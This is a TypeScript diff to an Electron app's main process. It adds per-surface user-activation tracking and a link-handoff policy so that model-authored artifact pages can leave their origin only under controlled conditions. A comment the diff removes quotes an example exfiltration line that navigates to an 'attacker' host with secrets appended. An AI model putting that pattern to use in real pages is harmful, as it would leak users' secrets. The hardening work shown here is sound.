@@ -60,11 +60,13 @@ import type { IpcMainInvokeEvent, WebContents } from 'electron';
 import { desktopWorkspaceIdentityKey } from '../common/desktop';
 import {
   ArtifactPreviewController,
+  ArtifactUserActivation,
   applyGlobalNavigationPolicy,
   artifactWebPreferences,
   confineToArtifactOrigin,
   isArtifactUrl,
   loadArtifactInitialUrl,
+  type ArtifactLinkHandoff,
   type ArtifactViewHandle,
 } from './artifact-viewers';
 import type {
@@ -2880,6 +2882,51 @@ function artifactServingDomain(): string {
   return process.env.VITE_ARTIFACT_SERVING_DOMAIN?.trim() || 'rallyusercontent.com';
 }
 
+/**
+ * How one artifact surface is allowed to leave its origin.
+ *
+ * The activation state is built here rather than in the policy module because
+ * it is reconstructed from Electron's own `input-event` stream: the main
+ * process is told nothing about user activation when a navigation starts, so
+ * the presses that reach these contents are the only evidence there is. One
+ * tracker per surface — the rail preview and a pop-out show different
+ * documents, and a shared flag would let a click in one send the other away.
+ */
+function artifactLinkHandoff(contents: WebContents): ArtifactLinkHandoff {
+  const activation = new ArtifactUserActivation();
+  contents.on('input-event', (_event, input) => activation.record(input.type));
+  // A committed main-frame navigation ends the document the press belonged to.
+  // `did-navigate` is the right event and `did-navigate-in-page` deliberately is
+  // not: a fragment jump leaves the same document on screen, and a browser does
+  // not drop activation for one either.
+  contents.on('did-navigate', () => activation.reset());
+  return {
+    takeActivation: () => activation.take(),
+    // The same scheme policy every other handoff in this process uses: http(s)
+    // only, and https only once packaged.
+    externalAllowed: isAllowedExternalUrl,
+    // Caught rather than discarded: the OS opener rejects when it cannot launch
+    // the URL — no registered default browser, a handler that refuses — and an
+    // unhandled rejection takes the main process down, since this process only
+    // *monitors* uncaught exceptions. Failing to follow a link must cost a log
+    // line, not the window somebody was reading.
+    openExternal: (url) => {
+      void shell.openExternal(url).catch((error: unknown) => {
+        logWarn('rally', 'could not open an artifact link in the browser', error);
+      });
+    },
+    // Through the same loader the initial presentation uses, so a page that
+    // redeems or redirects on arrival is not mistaken for a failed load. The URL
+    // is never logged: it is model-authored and may carry whatever the page put
+    // in it.
+    navigateInPlace: (url) => {
+      void loadArtifactInitialUrl(() => contents.loadURL(url)).then((loaded) => {
+        if (!loaded) logWarn('rally', 'could not follow a link inside a site preview');
+      });
+    },
+  };
+}
+
 function artifactPreviewFor(window: BrowserWindow): ArtifactPreviewController {
   const existing = artifactPreviews.get(window);
   if (existing) return existing;
@@ -2905,7 +2952,7 @@ function artifactPreviewFor(window: BrowserWindow): ArtifactPreviewController {
       // is the only part of a torn-down surface that can be asked anything.
       const contents = view.webContents;
       artifactWebContents.add(contents);
-      confineToArtifactOrigin(contents, new URL(request.url).origin);
+      confineToArtifactOrigin(contents, new URL(request.url).origin, artifactLinkHandoff(contents));
       window.contentView.addChildView(view);
       const handle: ArtifactViewHandle = {
         destroyed: () => contents.isDestroyed(),
@@ -2954,7 +3001,7 @@ function openArtifactWindow(request: { artifactId: string; url: string; title: s
     webPreferences: artifactWebPreferences(request.artifactId, app.isPackaged),
   });
   artifactWebContents.add(window.webContents);
-  confineToArtifactOrigin(window.webContents, new URL(request.url).origin);
+  confineToArtifactOrigin(window.webContents, new URL(request.url).origin, artifactLinkHandoff(window.webContents));
   // The artifact controls document.title, but this strip belongs to Rally's
   // window. Keep the bounded resource title instead of letting remote markup
   // rename the native chrome after it loads.
@@ -3532,12 +3579,11 @@ function hardenWebContents(contents: WebContents): void {
   });
 
   const preventUntrustedNavigation = (event: Electron.Event, url: string): void => {
-    // Artifact surfaces are refused, never handed off. Opening a URL an
-    // artifact composed would make Rally perform the exfiltration the egress
-    // fence exists to prevent: `location = "https://attacker/?" + secrets` is a
-    // navigation, which no CSP directive governs. `confineToArtifactOrigin`
-    // owns what these contents may do; the global listener must return before
-    // preventing anything on those contents.
+    // Artifact surfaces are never decided here. What a model-authored page may
+    // do with a URL turns on transient user activation, which this broad fence
+    // knows nothing about, and on the artifact's own origin, which it does not
+    // hold: `confineToArtifactOrigin` owns both. The global listener must
+    // return before preventing anything on those contents.
     applyGlobalNavigationPolicy({
       event,
       url,
